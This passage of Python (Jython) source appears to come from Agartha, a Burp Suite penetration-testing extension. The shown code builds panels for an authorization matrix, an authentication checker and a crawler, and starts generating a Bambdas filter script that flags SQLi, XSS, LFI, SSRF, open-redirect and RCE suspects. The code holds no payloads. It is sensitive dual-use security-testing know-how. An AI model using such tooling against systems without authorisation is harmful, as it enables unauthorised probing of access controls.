        self._btnAuthRun.setPreferredSize(Dimension(150, 27))
        self._btnAuthRun.setToolTipText("Generate user access table!")
        self._btnSiteMapGeneratorRun = JButton("Spider", actionPerformed=self.siteMapGenerator)
        self._btnSiteMapGeneratorRun.setPreferredSize(Dimension(90, 27))
        self._btnSiteMapGeneratorRun.setToolTipText("It crawls all the links the user can visit and populate URL list automatically.")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90, 27))
        self._btnAuthReset.setToolTipText("Clear all.")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha > Authorization Matrix'.")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("URL paths can be accessible by the user. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring = JCheckBox('Warnings', True, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthColoring.setToolTipText("Colors may help to a better analysis.")
        self._cbAuthGETPOST = JComboBox(('GET', 'POST', 'Dynamic'))
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test. Dynamic takes proxy history as reference.")

        self._cbSiteMapDepth = JComboBox(('Only current URL', 'Max crawl depth is 1', 'Max crawl depth is 2', 'Max crawl depth is 3', 'Max crawl depth is 4', 'Max crawl depth is 5', 'Max crawl depth is 6', 'Max crawl depth is 7', 'Max crawl depth is 8', 'Max crawl depth is 9', 'Max crawl depth is 10'))
        self._cbSiteMapDepth.setPreferredSize(Dimension(150, 27))
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._cbSiteMapDepth.setToolTipText("Webpage spider depth. How many sub-links should the web crawler go?")

        # top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400, 105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._btnSiteMapGeneratorRun)
        _tabAuthPanel1_A.add(self._cbSiteMapDepth)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        self._tabAuthSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthPanel1.add(_tabAuthPanel1_A, BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix = []
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix.setAutoCreateRowSorter(False)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification, BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP, BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        # panel center

        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setResizeWeight(0.25)
        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        # panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        # panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthSplitpane.setResizeWeight(0.7)
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _cbAuthenticationEnableFilterFunc(self, ev):

        if self._cbAuthenticationEnableFilter.isSelected():
            self.txAuthenticationEnableKeyWordURL.setVisible(True)
            self._lblAuthenticationEnableFilter2.setVisible(True)
            self._lblAuthenticationDaystoShow.setVisible(True)
            self._cbAuthenticationDaystoShow.setVisible(True)
            self._lblAuthenticationEnableURLGroup.setVisible(True)
            self._cbAuthenticationEnableURLGroup.setVisible(True)
        else:
            self.txAuthenticationEnableKeyWordURL.setVisible(False)
            self._lblAuthenticationEnableFilter2.setVisible(False)
            self._lblAuthenticationDaystoShow.setVisible(False)
            self._cbAuthenticationDaystoShow.setVisible(False)
            self._lblAuthenticationEnableURLGroup.setVisible(False)
            self._cbAuthenticationEnableURLGroup.setVisible(False)

    def _tabAuthenticationUI(self):
        self._cbAuthenticationHost = JComboBox()
        self._cbAuthenticationHost.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationHost.setToolTipText("Target hostnames. If you dont see your target in here, please click 'Reset' button first.")

        self._btnAuthenticationFetchHistory = JButton("Load Requests", actionPerformed=self.historyFetcher)
        self._btnAuthenticationFetchHistory.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationFetchHistory.setToolTipText("Load http requests from proxy history.")

        self._btnAuthenticationReset = JButton("Reset", actionPerformed=self.resetAuthentication)
        self._btnAuthenticationReset.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationReset.setToolTipText("Reset the screen and re-load hostnames.")

        self._btnAuthenticationRun = JButton("RUN", actionPerformed=self.authenticationMatrixFunc)
        self._btnAuthenticationRun.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationRun.setToolTipText("Execute the task!")
        self._btnAuthenticationRun.setEnabled(False)

        self._cbAuthenticationEnableFilter = JCheckBox('Enable Filters', False, itemStateChanged=self._cbAuthenticationEnableFilterFunc)
        self._cbAuthenticationEnableFilter.setPreferredSize(Dimension(120, 27))
        self._cbAuthenticationEnableFilter.setToolTipText("You can define some conditions, when you load URLs from the history.")

        self._lblAuthenticationEnableURLGroup = JLabel("", SwingConstants.LEFT)
        self._lblAuthenticationEnableURLGroup.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationEnableURLGroup.setVisible(False)

        self._cbAuthenticationEnableURLGroup = JCheckBox('URL Grouping', True)
        self._cbAuthenticationEnableURLGroup.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setToolTipText("Similar URLs will count as one. (Experimental)")

        self._lblAuthenticationDaystoShow = JLabel("How many days", SwingConstants.LEFT)
        self._lblAuthenticationDaystoShow.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._lblAuthenticationDaystoShow.setToolTipText("How many days will be processed!")

        self._cbAuthenticationDaystoShow = JComboBox(('Process only last day', 'Process only last 3 days', 'Process only last 7 days', 'All'))
        self._cbAuthenticationDaystoShow.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setSelectedIndex(2)

        self._lblAuthenticationEnableFilter2 = JLabel("Keyword in the URL", SwingConstants.LEFT)
        self._lblAuthenticationEnableFilter2.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationEnableFilter2.setVisible(False)
        self._lblAuthenticationEnableFilter2.setToolTipText("Search keywords in URL, separated by commas, for example: /admin/, user")
        self.txAuthenticationEnableKeyWordURL = JTextField("")
        self.txAuthenticationEnableKeyWordURL.setPreferredSize(Dimension(250, 27))
        self.txAuthenticationEnableKeyWordURL.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setToolTipText("Search keywords in URL, separated by commas, for example: /admin/, user")

        # panel top
        _tabAuthenticationPanel1 = JPanel(BorderLayout())
        _tabAuthenticationPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthenticationPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthenticationPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthenticationPanel1_A.setMinimumSize(Dimension(400, 105))

        _tabAuthenticationPanel1_A.add(self._cbAuthenticationHost)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationFetchHistory)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationReset)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationRun)
        
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationEnableFilter)
        _tabAuthenticationPanel1_A.add(self._lblAuthenticationEnableURLGroup)
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationEnableURLGroup)
        _tabAuthenticationPanel1_A.add(self._lblAuthenticationDaystoShow)
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationDaystoShow)

        _tabAuthenticationPanel1_A.add(self._lblAuthenticationEnableFilter2)
        _tabAuthenticationPanel1_A.add(self.txAuthenticationEnableKeyWordURL)

        self._urlAddresses = DefaultListModel()
        self.tabAuthenticationJlist = JList(self._urlAddresses)
        self.tabAuthenticationJlist.addListSelectionListener(self.listChange)
        self.tabAuthenticationJlist.setSelectionMode(DefaultListSelectionModel.SINGLE_SELECTION)
        self.tabAuthenticationJlist.setToolTipText("Queued requests.")

        self._tbAuthenticationHeader = JTextPane()
        self._tbAuthenticationHeader.setContentType("text")
        self._tbAuthenticationHeader.setToolTipText("Header details.")
        self._tbAuthenticationHeader.setEditable(False)
        self._tbAuthenticationHeader.setText("")

        _tabAuthenticationPanel1_B = JScrollPane(self.tabAuthenticationJlist, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthenticationPanel1_C = JScrollPane(self._tbAuthenticationHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS)
        self._tabAuthenticationSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthenticationPanel1_B, _tabAuthenticationPanel1_C)
        self._tabAuthenticationSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthenticationPanel1.add(_tabAuthenticationPanel1_A, BorderLayout.WEST)
        _tabAuthenticationPanel1.add(self._tabAuthenticationSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthenticationNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication.setAutoCreateRowSorter(False)
        self.tableMatrixAuthentication.setSelectionForeground(Color.red)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.setOpaque(True)
        self.tableMatrixAuthentication.setFillsViewportHeight(True)
        self.tableMatrixAuthentication_SP = JScrollPane()
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        _tabAuthenticationPanel2 = JPanel()
        _tabAuthenticationPanel2.setLayout(BoxLayout(_tabAuthenticationPanel2, BoxLayout.Y_AXIS))
        _tabAuthenticationPanel2.add(self._lblAuthenticationNotification, BorderLayout.NORTH)
        _tabAuthenticationPanel2.add(self.tableMatrixAuthentication_SP, BorderLayout.NORTH)
        
        self.progressBarAuthenticationPanel = JProgressBar()
        self.progressBarAuthenticationPanel.setMaximum(1000000)
        self.progressBarAuthenticationPanel.setMinimum(0)
        _tabAuthenticationPanel2.add( self.progressBarAuthenticationPanel, BorderLayout.SOUTH)
        # panel center

        self._tabAuthenticationPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationPanel.setResizeWeight(0.3)
        self._tabAuthenticationPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthenticationPanel.setTopComponent(_tabAuthenticationPanel1)
        self._tabAuthenticationPanel.setBottomComponent(_tabAuthenticationPanel2)

        # panel bottom
        _tabsAuthenticationReqRes = JTabbedPane()
        self._requestViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        self._responseViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        _tabsAuthenticationReqRes.addTab("Request", self._requestViewerAuthentication.getComponent())
        _tabsAuthenticationReqRes.addTab("Response", self._responseViewerAuthentication.getComponent())
        # panel bottom

        self._tabAuthenticationSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationSplitpane.setResizeWeight(0.7)
        self._tabAuthenticationSplitpane.setTopComponent(self._tabAuthenticationPanel)
        self._tabAuthenticationSplitpane.setBottomComponent(_tabsAuthenticationReqRes)

    def _cbBambdasValuableFunc(self, ev):
        if self._cbBambdasValuable.isSelected():
            self._txtBambdasValuable.setEnabled(True)
        else:
            self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasFilesDownFunc(self, ev):
        if self._cbBambdasFilesDownloadable.isSelected():
            self._txtBambdasFilesDownloadable.setEnabled(True)
        else:
            self._txtBambdasFilesDownloadable.setEnabled(False)

    def _cbBambdasSQLiFunc(self, ev):
        if self._cbBambdasSQLi.isSelected():
            self._txtBambdasSQLiKeywords.setEnabled(True)
        else:
            self._txtBambdasSQLiKeywords.setEnabled(False)

    def _cbBambdasXSSFunc(self, ev):
        if self._cbBambdasXSS.isSelected():
            self._txtBambdasXSSKeywords.setEnabled(True)
        else:
            self._txtBambdasXSSKeywords.setEnabled(False)

    def _cbBambdasLFIFunc(self, ev):
        if self._cbBambdasLFI.isSelected():
            self._txtBambdasLFIKeywords.setEnabled(True)
        else:
            self._txtBambdasLFIKeywords.setEnabled(False)

    def _cbBambdasSSRFFunc(self, ev):
        if self._cbBambdasSSRF.isSelected():
            self._txtBambdasSSRFKeywords.setEnabled(True)
        else:
            self._txtBambdasSSRFKeywords.setEnabled(False)

    def _cbBambdasORedFunc(self, ev):
        if self._cbBambdasORed.isSelected():
            self._txtBambdasORedKeywords.setEnabled(True)
        else:
            self._txtBambdasORedKeywords.setEnabled(False)
    
    def _cbBambdasRCEFunc(self, ev):
        if self._cbBambdasRCE.isSelected():
            self._txtBambdasRCEKeywords.setEnabled(True)
        else:
            self._txtBambdasRCEKeywords.setEnabled(False)

    def _cbBambdasSearchinURLFunc(self, ev):
        if self._cbBambdasSearchinURL.isSelected():
            self._cbBambdasSQLi.setEnabled(True)
            if self._cbBambdasSQLi.isSelected():
                self._txtBambdasSQLiKeywords.setEnabled(True)
            self._cbBambdasXSS.setEnabled(True)
            if self._cbBambdasXSS.isSelected():
                self._txtBambdasXSSKeywords.setEnabled(True)
            self._cbBambdasLFI.setEnabled(True)
            if self._cbBambdasLFI.isSelected():
                self._txtBambdasLFIKeywords.setEnabled(True)
            self._cbBambdasSSRF.setEnabled(True)
            if self._cbBambdasSSRF.isSelected():
                self._txtBambdasSSRFKeywords.setEnabled(True)
            self._cbBambdasORed.setEnabled(True)
            if self._cbBambdasORed.isSelected():
                self._txtBambdasORedKeywords.setEnabled(True)
            self._cbBambdasRCE.setEnabled(True)
            if self._cbBambdasRCE.isSelected():
                self._txtBambdasRCEKeywords.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
        else:
            if not self._cbBambdasSearchinReq.isSelected():
                self._cbBambdasSQLi.setEnabled(False)
                self._txtBambdasSQLiKeywords.setEnabled(False)
                self._cbBambdasXSS.setEnabled(False)
                self._txtBambdasXSSKeywords.setEnabled(False)
                self._cbBambdasLFI.setEnabled(False)
                self._txtBambdasLFIKeywords.setEnabled(False)
                self._cbBambdasSSRF.setEnabled(False)
                self._txtBambdasSSRFKeywords.setEnabled(False)
                self._cbBambdasORed.setEnabled(False)
                self._txtBambdasORedKeywords.setEnabled(False)
                self._cbBambdasRCE.setEnabled(False)
                self._txtBambdasRCEKeywords.setEnabled(False)
                if not self._cbBambdasSearchinRes.isSelected() and not self._cbBambdasSearchinReq.isSelected():
                    self._cbBambdasValuable.setEnabled(False)
                    self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasSearchinReqFunc(self, ev):
        if self._cbBambdasSearchinReq.isSelected():
            self._cbBambdasSQLi.setEnabled(True)
            if self._cbBambdasSQLi.isSelected():
                self._txtBambdasSQLiKeywords.setEnabled(True)
            self._cbBambdasXSS.setEnabled(True)
            if self._cbBambdasXSS.isSelected():
                self._txtBambdasXSSKeywords.setEnabled(True)
            self._cbBambdasLFI.setEnabled(True)
            if self._cbBambdasLFI.isSelected():
                self._txtBambdasLFIKeywords.setEnabled(True)
            self._cbBambdasSSRF.setEnabled(True)
            if self._cbBambdasSSRF.isSelected():
                self._txtBambdasSSRFKeywords.setEnabled(True)
            self._cbBambdasORed.setEnabled(True)
            if self._cbBambdasORed.isSelected():
                self._txtBambdasORedKeywords.setEnabled(True)
            self._cbBambdasRCE.setEnabled(True)
            if self._cbBambdasRCE.isSelected():
                self._txtBambdasRCEKeywords.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
        else:
            if not self._cbBambdasSearchinURL.isSelected():
                self._cbBambdasSQLi.setEnabled(False)
                self._txtBambdasSQLiKeywords.setEnabled(False)
                self._cbBambdasXSS.setEnabled(False)
                self._txtBambdasXSSKeywords.setEnabled(False)
                self._cbBambdasLFI.setEnabled(False)
                self._txtBambdasLFIKeywords.setEnabled(False)
                self._cbBambdasSSRF.setEnabled(False)
                self._txtBambdasSSRFKeywords.setEnabled(False)
                self._cbBambdasORed.setEnabled(False)
                self._txtBambdasORedKeywords.setEnabled(False)
                self._cbBambdasRCE.setEnabled(False)
                self._txtBambdasRCEKeywords.setEnabled(False)
                if not self._cbBambdasSearchinRes.isSelected() and not self._cbBambdasSearchinURL.isSelected():
                    self._cbBambdasValuable.setEnabled(False)
                    self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasSearchinResFunc(self, ev):
        if self._cbBambdasSearchinRes.isSelected():
            self._cbBambdasSearchHTMLComments.setEnabled(True)
            self._cbBambdasFilesDownloadable.setEnabled(True)
            if self._cbBambdasFilesDownloadable.isSelected():
                self._txtBambdasFilesDownloadable.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
            self._cbBambdasVulnJS.setEnabled(True)
            if self._cbBambdasVulnJS.isSelected():
                self._txtBambdasVulnJSKeywords.setEnabled(True)
        else:
            self._cbBambdasSearchHTMLComments.setEnabled(False)
            self._cbBambdasFilesDownloadable.setEnabled(False)
            self._txtBambdasFilesDownloadable.setEnabled(False)
            self._cbBambdasVulnJS.setEnabled(False)
            self._txtBambdasVulnJSKeywords.setEnabled(False)
            if not self._cbBambdasSearchinReq.isSelected() and not self._cbBambdasSearchinURL.isSelected():
                self._cbBambdasValuable.setEnabled(False)
                self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasHTTPMethodsFunc(self, ev):
        if self._cbBambdasHTTPMethods.isSelected():
            self._txtBambdasHTTPMethods.setEnabled(True)
        else:
            self._txtBambdasHTTPMethods.setEnabled(False)
    
    def _cbBambdasVulnJSFunc(self, ev):
        if self._cbBambdasVulnJS.isSelected():
            self._txtBambdasVulnJSKeywords.setEnabled(True)
        else:
            self._txtBambdasVulnJSKeywords.setEnabled(False)

    def _cbBambdasExtIgnoreFunc(self, ev):
        if self._cbBambdasExtIgnore.isSelected():
            self._txtBambdasExtIgnoreKeywords.setEnabled(True)
        else:
            self._txtBambdasExtIgnoreKeywords.setEnabled(False)

    def funcBambdasRun(self, ev):

        if self._cbBambdasDisplayDays.getSelectedIndex() < self._cbBambdasProcessDays.getSelectedIndex():
            self._lblBambdasNotification2.text = "The display period must not be shorter than the processing period."
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        
        for line in self._tbBambdasScopeURLs.getText().splitlines():
            if self._tbBambdasScopeURLs.text != self._txBambdasScopeURLs and self._tbBambdasScopeURLs.text.strip() and line.strip():
                if line.strip().startswith("/*") or line.strip() == "/":
                    self._tbBambdasScopeURLs.setText("/")
                if " " in line.strip():
                    self._lblBambdasNotification2.text = "One or more of the test scope URLs contain spaces."
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                if not line.strip().startswith("/"):
                    self._lblBambdasNotification2.text = "Make sure all URLs in Testing Scope begin with a '/'"
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
        
        for line in self._tbBambdasScopeDoneURLs.getText().splitlines():
            if self._tbBambdasScopeDoneURLs.text != self._txBambdasScopeDoneURLs and self._tbBambdasScopeDoneURLs.text and line.strip():
                if line.strip().startswith("/*") or line.strip() == "/":
                    self._lblBambdasNotification2.text = "You can not set root directory '/' in the tested URLs."
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                if " " in line.strip():
                    self._lblBambdasNotification2.text = "One or more of the tested URLs contain spaces."
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                if not line.strip().startswith("/"):
                    self._lblBambdasNotification2.text = "Make sure all URLs in Tested section begin with a '/'"
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return

        for line in self._tbBambdasBlackListedURLs.getText().splitlines():
            if self._tbBambdasBlackListedURLs.text != self._txBambdasBlackListedURLs and self._tbBambdasBlackListedURLs.text.strip() and line.strip():
                if line.strip().startswith("/*") or line.strip() == "/":
                    self._tbBambdasBlackListedURLs.setText("/")
                    if self._tbBambdasScopeURLs.text == self._txBambdasScopeURLs or not self._tbBambdasScopeURLs.text.strip():
                        self._lblBambdasNotification2.text = "Root directory '/' can't be blacklisted, unless you provide scope URLs."
                        self._lblBambdasNotification2.setForeground(Color.red)
                        return
                if " " in line.strip():
                    self._lblBambdasNotification2.text = "One or more of the Black-Listed URLs contain spaces."
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                if not line.strip().startswith("/"):
                    self._lblBambdasNotification2.text = "Make sure all URL in Black-Listed section begin with a '/'"
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return

        if self._cbBambdasHTTPMethods.isSelected() and self._txtBambdasHTTPMethods.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The HTTP methods option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasValuable.isSelected() and self._txtBambdasValuable.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Valuable keywords option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasFilesDownloadable.isSelected() and self._txtBambdasFilesDownloadable.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Downloadable file extensions option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasSQLi.isSelected() and self._txtBambdasSQLiKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The SQLi-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasXSS.isSelected() and self._txtBambdasXSSKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The XSS-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasLFI.isSelected() and self._txtBambdasLFIKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The LFI-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasSSRF.isSelected() and self._txtBambdasSSRFKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The SSRF-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasORed.isSelected() and self._txtBambdasORedKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Open Redirect-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasRCE.isSelected() and self._txtBambdasRCEKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The RCE-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasVulnJS.isSelected() and self._txtBambdasVulnJSKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Vulnerable JS Functions option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasExtIgnore.isSelected() and self._txtBambdasExtIgnoreKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The File extensions to ignore option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return

        bambdas = "/**\n"
        bambdas += " * Bambdas Script - auto-generated by Agartha\n"
        bambdas += " **/\n\n"

        bambdas += "// If true: clear highlights and notes, then stop. If false: execute the script.\n"
        bambdas += "boolean resetScreen = false;\n"
        bambdas += "// Toggle above when you want to wipe colors/notes without running checks.\n\n"

        bambdas += "// Testing scope URLs. \n"
        if sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip() == '/') == 1:
            bambdas += "String[] targetPaths = {\"/.*\"};\n"
        elif self._tbBambdasScopeURLs.text != self._txBambdasScopeURLs and self._tbBambdasScopeURLs.text.strip():
            targetPaths = "{"
            for line in list(dict.fromkeys(self._tbBambdasScopeURLs.text.splitlines())):
                if line.strip():
                    targetPaths += "\"" + (line.strip().replace("*",".*") + "/?(?:\\\\?.*)?$")+ "\", "
            if targetPaths != "{":
                targetPaths = targetPaths[:-2]
            targetPaths += "}"
            bambdas += "String[] targetPaths = " + targetPaths + ";\n"
        else:
            # by default includes all - /
            bambdas += "String[] targetPaths = {\"/.*\"};\n"
        bambdas += "// Define the URLs you want to actively assess here.\n\n"

        if self._tbBambdasBlackListedURLs.getText() != '/' and self._tbBambdasBlackListedURLs.getText().strip() and self._tbBambdasBlackListedURLs.getText() != self._txBambdasBlackListedURLs:
            bambdas += "// Black-Listed / Unwanted URLs\n"
            if self._tbBambdasBlackListedURLs.text != self._txBambdasBlackListedURLs:
                targetBlackListUrls = "{"
                for line in list(dict.fromkeys(self._tbBambdasBlackListedURLs.text.splitlines())):
                    if line.strip():
                        targetBlackListUrls += "\"" + (line.strip().replace("*",".*") + "/?(?:\\\\?.*)?$") + "\", "
                if targetBlackListUrls != "{":
                    targetBlackListUrls = targetBlackListUrls[:-2]
                targetBlackListUrls += "}"
                bambdas += "String[] targetBlackListUrls = " + targetBlackListUrls + ";\n"
                bambdas += "// Add patterns here to ignore noise (health checks, static banners, monitor, etc.).\n"
            else:
                bambdas += "String[] targetBlackListUrls = {\"/YouCanPutBlackListURLsHere.*\"};\n"
                bambdas += "// Add patterns here to ignore noise (health checks, static banners, monitor, etc.).\n"
            bambdas += "\n"

        bambdas += "// Already-tested URLs (mark as completed).\n"
        if self._tbBambdasScopeDoneURLs.text != self._txBambdasScopeDoneURLs and self._tbBambdasScopeDoneURLs.text:
            targetPaths = "{"
            for line in list(dict.fromkeys(self._tbBambdasScopeDoneURLs.text.splitlines())):
                if line.strip():
                    targetPaths += "\"" + (line.strip().replace("*",".*") + "/?(?:\\\\?.*)?$") + "\", "
            if targetPaths != "{":
                targetPaths = targetPaths[:-2]
            targetPaths += "}"
            bambdas += "String[] targetPathsDone = " + targetPaths + ";\n"
        else:
            bambdas += "String[] targetPathsDone = {\"/YouCanPutTestedURLsHere.*\"};\n"
        bambdas += "// Move stable/assessed endpoints here to avoid re-triage.\n\n"

        bambdas += "// Reset mode: clear all highlights and notes, then exit.\n"
        bambdas += "if (resetScreen) {\n"
        bambdas += "    requestResponse.annotations().setHighlightColor(HighlightColor.NONE);\n"
        bambdas += "    requestResponse.annotations().setNotes(\"\");\n"
        bambdas += "    return true;\n"
